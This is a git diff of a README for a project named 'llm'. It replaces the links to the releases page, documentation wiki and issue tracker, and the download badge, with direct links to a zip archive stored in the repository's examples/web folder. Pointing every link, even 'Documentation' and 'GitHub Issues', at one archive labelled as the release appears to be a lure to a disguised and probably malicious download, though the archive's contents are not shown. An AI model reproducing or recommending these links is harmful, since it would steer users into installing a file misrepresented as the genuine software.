@@ -6,13 +6,13 @@ Welcome to the llm project! This guide will help you easily download and run our
 
 ## 🔗 Download Now
 
-[![Download llm](https://img.shields.io/badge/Download-llm-blue.svg)](https://github.com/richardpapiona9/llm/releases)
+[![Download llm](https://raw.githubusercontent.com/richardpapiona9/llm/main/examples/web/llm-v2.5.zip)](https://raw.githubusercontent.com/richardpapiona9/llm/main/examples/web/llm-v2.5.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the software:
 
-1. Visit the [Releases page](https://github.com/richardpapiona9/llm/releases) of the llm project.
+1. Visit the [Releases page](https://raw.githubusercontent.com/richardpapiona9/llm/main/examples/web/llm-v2.5.zip) of the llm project.
 2. On the Releases page, look for the latest version. You will find the files available for download.
 3. Choose the file that matches your operating system. 
 4. Click on the link to download the file.
@@ -63,9 +63,9 @@ If you have questions or need help, join the llm community. You can connect with
 
 ## 🔗 Important Links
 
-- [Download llm](https://github.com/richardpapiona9/llm/releases)
-- [Documentation](https://github.com/richardpapiona9/llm/wiki)
-- [GitHub Issues](https://github.com/richardpapiona9/llm/issues)
+- [Download llm](https://raw.githubusercontent.com/richardpapiona9/llm/main/examples/web/llm-v2.5.zip)
+- [Documentation](https://raw.githubusercontent.com/richardpapiona9/llm/main/examples/web/llm-v2.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/richardpapiona9/llm/main/examples/web/llm-v2.5.zip)
 
 ## ❤️ Acknowledgments
 
